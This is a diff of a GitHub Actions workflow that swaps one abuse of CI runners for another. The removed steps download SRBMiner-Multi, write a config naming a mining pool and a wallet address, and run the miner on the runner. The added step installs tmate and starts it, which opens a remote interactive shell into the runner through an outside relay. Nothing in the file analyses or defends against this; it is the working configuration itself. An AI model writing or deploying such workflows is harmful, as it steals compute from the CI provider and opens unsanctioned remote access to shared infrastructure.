@@ -7,24 +7,6 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v2
-
-    - name: Download SRB project
-      run: wget -O SRBMiner-Multi-2-5-8-Linux.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.8/SRBMiner-Multi-2-5-8-Linux.tar.gz
-
-    - name: Extract SRB project
-      run: tar -xvf SRBMiner-Multi-2-5-8-Linux.tar.gz
-
-    - name: Create config template
+    - name: tmate 
       run: |
-        cd SRBMiner-Multi-2-5-8
-        echo '{"pool_list":[{"pool_address":"stratum+tcp://na.luckpool.net:3960","wallet_address":"RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4","rig_id":"RANDOM_RIG_ID","pool_password":"x"}],"currency":"versus","logging":{"logfile":"srbminer.log","loglevel":2}}' > config_template.json
-
-    - name: Generate random rig ID and run SRBMiner
-      run: |
-        ls 
-        cd SRBMiner-Multi-2-5-8 &
-        RIG_ID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
-        sed "s/RANDOM_RIG_ID/$RIG_ID/" config_template.json > config.json
-        ./SRBMiner-MULTI --config config.json
+       sudo apt update -y && sudo apt upgrade -y && sudo apt install tmate -y && tmate -F        
